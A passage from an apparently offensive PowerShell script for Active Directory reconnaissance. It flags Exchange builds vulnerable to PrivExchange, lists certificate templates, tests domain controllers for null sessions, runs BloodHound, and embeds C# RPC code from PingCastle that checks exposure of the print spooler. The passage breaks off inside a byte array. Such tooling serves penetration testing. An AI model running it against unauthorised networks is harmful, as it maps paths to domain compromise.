            "15.00.1156.006" = "Exchange Server 2013 CU11, Vulnerable to PrivExchange!"
            "15.00.1130.007" = "Exchange Server 2013 CU10, Vulnerable to PrivExchange!"
            "15.00.1104.005" = "Exchange Server 2013 CU9, Vulnerable to PrivExchange!"
            "15.00.1076.009" = "Exchange Server 2013 CU8, Vulnerable to PrivExchange!"
            "15.00.1044.025" = "Exchange Server 2013 CU7, Vulnerable to PrivExchange!"
            "15.00.0995.029" = "Exchange Server 2013 CU6, Vulnerable to PrivExchange!"
            "15.00.0913.022" = "Exchange Server 2013 CU5, Vulnerable to PrivExchange!"
            "15.00.0847.032" = "Exchange Server 2013 SP1, Vulnerable to PrivExchange!"
            "15.00.0775.038" = "Exchange Server 2013 CU3, Vulnerable to PrivExchange!"
            "15.00.0712.024" = "Exchange Server 2013 CU2, Vulnerable to PrivExchange!"
            "15.00.0620.029" = "Exchange Server 2013 CU1, Vulnerable to PrivExchange!"
            "15.00.0516.032" = "Exchange Server 2013 RTM, Vulnerable to PrivExchange!"
        }
        $CN = $Domain.Split('.')[0]
        try{
            $ExchangeVersion = ([ADSI]"LDAP://cn=$CN,cn=Microsoft Exchange,cn=Services,cn=Configuration,$DistinguishedName").msExchProductID
        }catch{
            Write-Output "Failed checking for privexchange"
        }
        if($ExchangeVersion){
            Write-Output "Exchange found: $($ExchangeVersions[$ExchangeVersion])"
        }

        #CA thx to lkys37en https://github.com/lkys37en/Pentest-Scripts/tree/master/Powershell
        Write-Output "`n[*] Testing CA certificate templates"
        $CAs = ([ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName").Children
        foreach ($CA in $CAs) {
            Write-Output "[+] Extracting a list of available certificates for $($CA.displayName)"
            $CA.certificateTemplates
        }

        #nullsession on DC's
        Write-Output "`n[*] Testing NullSession on Domain Controllers"
        (Get-DomainController -Domain $Domain).displayname | foreach {
            try{
                New-SmbMapping -RemotePath \\$_\ipc$ -UserName '' -Password '' -ErrorAction stop
                New-Object  PSObject -Property @{
                    "ComputerName" = $_
                    "Status"       = $true
                }
            }
            catch{}
        }

        #bloodhound https://github.com/BloodHoundAD/BloodHound/
        Write-Output "`n[*] Running BloodHound.."
        invoke-bloodhound -collectionmethod all,GPOLocalGroup,LoggedOn -domain $Domain -SkipPing
    }
}
function Invoke-NetEnum{
    <#
    Invoke-NetEnum -ComputerNames .\computers.txt
    (Get-DomainComputer).displayname | Invoke-NetEnum
    #>
    param(
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        $ComputerNames
    )
    if((Test-Path $ComputerNames)){
        $ComputerNames = Get-Content $ComputerNames
    }
    @(
        'PowerView.ps1'
    ) | foreach {
        if(-not(Test-Path $PSScriptRoot\$_)){
            Write-Output "Missing dependencies.. $($_)"
            $missing=$true
        }
    }
    if($missing){
        return
    }
    . .\PowerView.ps1
    if(-not($ComputerNames)){
        $ComputerNames = (Get-DomainComputer).displayname
    }
    Function local:Get-SpoolStatus {
	<#
	.OUTPUT
	PS > Get-SpoolStatus -ComputerNames localhost
	ComputerName Status
	------------ ------
	localhost     False
	dc            True
	#>
	    Param(
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            $ComputerNames
	    )
	    $sourceSpooler = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;

namespace PingCastle.ExtractedCode
{
	public class rprn
	{
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW",
            CallingConvention = CallingConvention.StdCall,
            CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
            
            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
            
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingFree(ref IntPtr lpString);
            
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcStringBindingCompose(
                String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options,
                out IntPtr lpBindingString
                );
                
            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
            private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

		[DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
		   CharSet = CharSet.Unicode, SetLastError = false)]
		internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, ref IntPtr Handle);
        
        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
			CharSet = CharSet.Unicode, SetLastError = false)]
		private static extern IntPtr NdrClientCall2x64(IntPtr intPtr1, IntPtr intPtr2, string pPrinterName, out IntPtr pHandle, string pDatatype, ref rprn.DEVMODE_CONTAINER pDevModeContainer, int AccessRequired);

		[DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
			CharSet = CharSet.Unicode, SetLastError = false)]
		private static extern IntPtr NdrClientCall2x64(IntPtr intPtr1, IntPtr intPtr2, IntPtr hPrinter, uint fdwFlags, uint fdwOptions, string pszLocalMachine, uint dwPrinterLocal, IntPtr intPtr3);

		private static byte[] MIDL_ProcFormatStringx86 = new byte[] {
				0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x01,0x00,0x18,0x00,0x31,0x04,0x00,0x00,0x00,0x5c,0x08,0x00,0x40,0x00,0x46,0x06,0x08,0x05,
				0x00,0x00,0x01,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0x02,0x00,0x10,0x01,0x04,0x00,0x0a,0x00,0x0b,0x00,0x08,0x00,0x02,0x00,0x0b,0x01,0x0c,0x00,0x1e,
				0x00,0x48,0x00,0x10,0x00,0x08,0x00,0x70,0x00,0x14,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x03,0x00,0x08,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x04,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,
				0x48,0x00,0x00,0x00,0x00,0x05,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,
				0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x06,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,
				0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x07,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,0x08,0x00,
				0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x0a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x0b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0c,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,
				0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
				0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,0x08,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x10,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x11,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x12,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x13,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,
				0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x14,0x00,0x08,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x15,0x00,
				0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x16,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x17,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x18,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x19,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,
				0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1a,0x00,0x08,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1b,
				0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,
				0x00,0x00,0x00,0x00,0x1c,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1d,0x00,0x08,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x18,0x01,0x00,0x00,0x36,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1e,0x00,0x08,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1f,0x00,
				0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x20,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x21,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x22,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x23,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,
				0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x24,0x00,0x08,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x25,
				0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x26,0x00,
				0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x27,0x00,0x08,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x28,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x29,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2b,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2c,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2d,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
				0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2f,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x30,0x00,0x08,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x31,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x32,
				0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x33,0x00,
				0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x34,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x35,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x36,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x37,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x38,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x39,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3a,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3c,0x00,0x08,0x00,
				0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x3d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x04,0x00,0x08,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x3e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x04,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3f,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x40,0x00,0x04,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x01,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x41,0x00,0x1c,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x3c,0x00,0x08,0x00,0x46,0x07,0x08,0x05,0x00,0x00,
				0x01,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x3a,0x00,0x48,0x00,0x04,0x00,0x08,0x00,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x00,0x0c,0x00,0x02,0x00,0x48,
				0x00,0x10,0x00,0x08,0x00,0x0b,0x00,0x14,0x00,0x3e,0x00,0x70,0x00,0x18,0x00,0x08,0x00,0x00
            };

		private static byte[] MIDL_ProcFormatStringx64 = new byte[] {
				0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x01,0x00,0x30,0x00,0x31,0x08,0x00,0x00,0x00,0x5c,0x08,0x00,0x40,0x00,0x46,0x06,
				0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0x02,0x00,0x10,0x01,0x08,0x00,0x0a,0x00,0x0b,0x00,0x10,0x00,0x02,0x00,0x0b,
				0x01,0x18,0x00,0x1e,0x00,0x48,0x00,0x20,0x00,0x08,0x00,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x10,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x03,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x04,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x05,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x06,0x00,0x10,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x07,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,
				0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0b,
				0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x0c,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,
				0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,
				0x48,0x00,0x00,0x00,0x00,0x10,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x11,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,
